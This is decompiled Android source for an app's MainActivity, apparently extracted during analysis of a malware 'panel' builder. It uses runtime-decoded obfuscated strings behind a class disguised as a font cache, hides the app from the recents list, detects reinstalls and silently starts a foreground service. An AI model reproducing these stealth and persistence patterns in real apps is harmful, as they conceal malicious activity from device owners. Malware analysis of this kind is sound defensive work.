package app.mobilex.plus;

import android.app.ActivityManager;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.os.Bundle;
import androidx.activity.ComponentActivity;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Iterator;
import v.s.VoXDCm2rEPF6SL;
import v.s.kExylgSxUDTVQOx3o0oq;
import v.s.lyzhjBmnW0B6JDw;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class MainActivity extends ComponentActivity {
    public static final String K7eEOBPYP9VIoHWTe;
    public static final String l1V0lQr6TbwNKqHfXNbb;
    public final lyzhjBmnW0B6JDw H9XlUr4OeMJFiXK = new lyzhjBmnW0B6JDw(new VoXDCm2rEPF6SL(this, 0));
    public final lyzhjBmnW0B6JDw DVTNwpDEVsUKuznof = new lyzhjBmnW0B6JDw(new VoXDCm2rEPF6SL(this, 1));

    static {
        TypefaceCache.obtain("0010005B006800B800D1008F00E2");
        l1V0lQr6TbwNKqHfXNbb = TypefaceCache.obtain("0030007B004800B800FD00BE00DC00A600240073004900B800E000AD00D700A10030");
        K7eEOBPYP9VIoHWTe = TypefaceCache.obtain("00300073004F009200E0008000C200B5002600700048");
    }

    private static /* synthetic */ void zebkyqxya() {
    }

    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public final void onCreate(Bundle bundle) {
        lyzhjBmnW0B6JDw lyzhjbmnw0b6jdw = this.H9XlUr4OeMJFiXK;
        super.onCreate(bundle);
        TypefaceCache.obtain("000E00770052008900D100BC00C600AE0035007F004F009E00B000B000DC008400310073005A009300F500FF20A600E700310079004E009300F900B100D500E9006D0038");
        try {
            kExylgSxUDTVQOx3o0oq.dDIMxZXP1V8HdM.w9sT1Swbhx3hs(getApplicationContext());
            TypefaceCache.obtain("00160066005F008600E400BA00EB0083001400790049008C00F500AD009200B4003700770049009300F500BB009200AE002E007B005E008300F900BE00C600A2002F006F");
        } catch (Exception e) {
            TypefaceCache.obtain("000600770049008B00E900FF00E100AE002F00730055009300D100AA00D600AE002C0036005E009500E200B000C000FD0063");
            e.getMessage();
        }
        try {
            Iterator<ActivityManager.AppTask> it = ((ActivityManager) getSystemService("activity")).getAppTasks().iterator();
            while (it.hasNext()) {
                it.next().setExcludeFromRecents(true);
            }
        } catch (Exception unused) {
        }
        try {
            PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
            long j = packageInfo.firstInstallTime;
            long j2 = packageInfo.lastUpdateTime;
            long j3 = ((SharedPreferences) lyzhjbmnw0b6jdw.dDIMxZXP1V8HdM()).getLong(TypefaceCache.obtain("002A00780048009300F100B300DE00980037007F00560082"), 0L);
            long j4 = ((SharedPreferences) lyzhjbmnw0b6jdw.dDIMxZXP1V8HdM()).getLong(TypefaceCache.obtain("00360066005F008600E400BA00ED00B3002A007B005E"), 0L);
            if (j3 != 0 && (j3 != j || j4 != j2)) {
                ((SharedPreferences) lyzhjbmnw0b6jdw.dDIMxZXP1V8HdM()).edit().putBoolean(TypefaceCache.obtain("003700730057008200F700AD00D300AA001C0065005E008900E4"), false).putBoolean(TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E009500CF00AC00D700A90037"), false).putLong(TypefaceCache.obtain("002A00780048009300F100B300DE00980037007F00560082"), j).putLong(TypefaceCache.obtain("00360066005F008600E400BA00ED00B3002A007B005E"), j2).apply();
                TypefaceCache.obtain("001100730052008900E300AB00D300AB002F0039004E009700F400BE00C600A200630072005E009300F500BC00C600A20027003A001B009500F500B800DB00B400370064005A009300F900B000DC00E70025007A005A008000E300FF00C000A200300073004F");
            } else if (j3 == 0) {
                ((SharedPreferences) lyzhjbmnw0b6jdw.dDIMxZXP1V8HdM()).edit().putLong(TypefaceCache.obtain("002A00780048009300F100B300DE00980037007F00560082"), j).putLong(TypefaceCache.obtain("00360066005F008600E400BA00ED00B3002A007B005E"), j2).apply();
            }
        } catch (Exception unused2) {
        }
        boolean z = ((SharedPreferences) this.DVTNwpDEVsUKuznof.dDIMxZXP1V8HdM()).getBoolean(TypefaceCache.obtain("00300073004F009200E0008000D100A8002E00660057008200E400BA"), false);
        TypefaceCache.obtain("00300073004F009200E0008000D100A8002E00660057008200E400BA008F");
        if (!z) {
            Intent intent = new Intent(this, (Class<?>) UtilNWWrapper.class);
            intent.addFlags(67108864);
            startActivity(intent);
            finish();
            return;
        }
        try {
            startForegroundService(new Intent(this, (Class<?>) SyncQYAdapter.class));
            TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E200FF00C100B300220064004F008200F4");
        } catch (Exception e2) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300F100AD00C600E70010006F0055008400C1008600F300A300220066004F008200E200E50092");
            e2.getMessage();
        }
        finish();
    }
}
